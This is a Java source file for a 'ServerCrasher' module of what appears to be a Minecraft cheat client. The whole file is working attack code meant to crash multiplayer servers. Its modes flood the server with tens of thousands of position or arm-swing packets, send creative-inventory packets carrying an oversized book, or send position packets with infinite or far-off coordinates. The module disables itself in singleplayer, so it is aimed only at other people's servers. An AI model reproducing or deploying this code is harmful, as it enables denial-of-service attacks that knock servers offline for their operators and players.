package com.mentalfrostbyte.jello.module.impl.world;

import com.mentalfrostbyte.jello.event.EventTarget;
import com.mentalfrostbyte.jello.event.impl.TickEvent;
import com.mentalfrostbyte.jello.module.Module;
import com.mentalfrostbyte.jello.module.ModuleCategory;
import com.mentalfrostbyte.jello.module.PremiumModule;
import com.mentalfrostbyte.jello.settings.ModeSetting;
import mapped.Class8906;
import net.minecraft.nbt.ListNBT;
import net.minecraft.nbt.StringNBT;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundNBT;
import net.minecraft.network.play.client.CAnimateHandPacket;
import net.minecraft.network.play.client.CCreativeInventoryActionPacket;
import net.minecraft.network.play.client.CPlayerPacket;
import net.minecraft.util.Hand;

public class ServerCrasher extends PremiumModule {
    private int tickCount;

    public ServerCrasher() {
        super(ModuleCategory.WORLD, "ServerCrasher", "Crashes a server");
        this.registerSetting(new ModeSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
    }

    @Override
    public void onEnable() {
        this.tickCount = 0;
    }

    @EventTarget
    private void onTick(TickEvent event) {
        if (this.isEnabled()) {
            if (mc.isSingleplayer()) {
                this.toggle();
            } else {
                String mode = this.getStringSettingValueByName("Mode");
                switch (mode) {
                    case "Flying Enabled":
                        double posX = mc.player.getPosX();
                        double posY = mc.player.getPosY();
                        double posZ = mc.player.getPosZ();

                        for (int i = 0; i < 50000; i++) {
                            double offset = i * 7;
                            mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(posX - offset, posY, posZ + offset, false));
                        }
                        Class8906.method32487("Trying to crash the server..");
                        this.toggle();
                        break;
                    case "Vanilla":
                        if (this.tickCount++ >= 10) {
                            this.tickCount = 0;
                            for (int i = 0; i < 100000; i++) {
                                mc.getConnection().sendPacket(new CAnimateHandPacket(Hand.MAIN_HAND));
                            }
                            Class8906.method32487("Trying to crash the server..");
                        }
                        break;
                    case "Book":
                        ItemStack bookItem = new ItemStack(Items.field38047); // field38047 is Book - Away
                        ListNBT pagesList = new ListNBT();
                        CompoundNBT bookTag = new CompoundNBT();
                        StringBuilder pageContent = new StringBuilder();

                        for (int i = 0; i < 5000; i++) {
                            char randomChar = (char) Math.round(32.0 + Math.random() * 94.0);
                            pageContent.append(randomChar);
                        }

                        for (int i = 0; i < 50; i++) {
                            StringNBT page = new StringNBT(pageContent.toString());
                            pagesList.add(page);
                        }

                        bookTag.putString("author", "LeakedPvP");
                        bookTag.putString("title", "Sigma");
                        bookTag.put("pages", pagesList);
                        bookItem.setTagInfo("pages", pagesList);
                        bookItem.setTag(bookTag);

                        for (int i = 0; i < 100; i++) {
                            try {
                                mc.getConnection().sendPacket(new CCreativeInventoryActionPacket(0, bookItem));
                            } catch (Exception e) {
                                // Handle exception if necessary
                            }
                        }
                        this.toggle();
                        break;
                    case "Infinity":
                        mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                        Class8906.method32487("Trying to crash the server..");
                        this.toggle();
                        break;
                    case "BrainFreeze":
                        mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(mc.player.getPosX() + 9999.0, mc.player.getPosY() + 9999.0, mc.player.getPosZ() + 9999.0, false));
                        mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(mc.player.getPosX(), mc.player.getBoundingBox().minY, mc.player.getPosZ() + 9999.0, mc.player.onGround));
                        if (this.tickCount++ >= 200) {
                            this.toggle();
                            Class8906.method32487("Trying to crash the server..");
                        }
                }
            }
        }
    }
}
